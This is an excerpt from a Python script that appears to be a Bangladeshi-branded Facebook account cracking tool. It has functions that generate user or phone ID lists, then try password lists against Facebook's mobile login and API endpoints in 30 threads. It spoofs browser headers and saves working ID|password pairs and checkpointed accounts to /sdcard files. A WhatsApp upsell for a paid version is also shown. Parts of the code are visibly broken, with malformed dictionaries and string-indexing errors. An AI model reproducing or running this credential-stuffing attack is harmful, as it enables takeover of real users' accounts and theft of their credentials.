#SOURCE BY :MR-ADI aNd RANI ðŸ¤™ðŸ¤™
...
def login():
        ...
        try:
                ...
                info = requests.get('https://free.facebook.com').text
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/groups/672751520627850/?ref=share);menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801759916221&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ADNAN Sir, I Need To Buy Your Paid TONU PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python TONU.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as TONU:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                ADNAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ADNAN:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: firstlast, first last, first@123\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [DIWASH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;DIWASH";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ADNAN=session.cookies.get_dict().keys()
                        if "c_user" in ADNAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [DIWASH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/DIWASH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ADNAN:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [DIWASH-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DIWASH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [DIWASH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DIWASH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ADNAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                 head ='authority': 'free.facebook.com',
                                 'method'.'POST'.
                                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                                  'cache-control': 'max-age=0',
                                  # 'cookie': 'datr=5A7eY7ZbYwkZ1OZvUWmIyvgb; sb=5Q7eY4AzxkctyD60sXKtmMFx; m_pixel_ratio=2.625; wd=412x756; dnonce=AWnvNNRlbnS5vv1JFlPYWdEBwNfwJIbAl3MABUa-_0LlwPfVg92XlKcoHH_LMMYSxjFAMHClkosZpJZwKMMafhxc; fr=06foLslzftlegLzqb..Bj3g7l.Rx.AAA.0.0.Bj3hSz.AWW-eOhOd1A',
                                  'sec-ch-ua': '"Chromium";v="107", "Not=A?DIWASH";v="24"',
                                  'sec-ch-ua-mobile': '?1',
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/DIWASH-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [DIWASH-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/DIWASH-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [DIWASH-OK] '+uid+' | '+pas+'\033[1;97m')
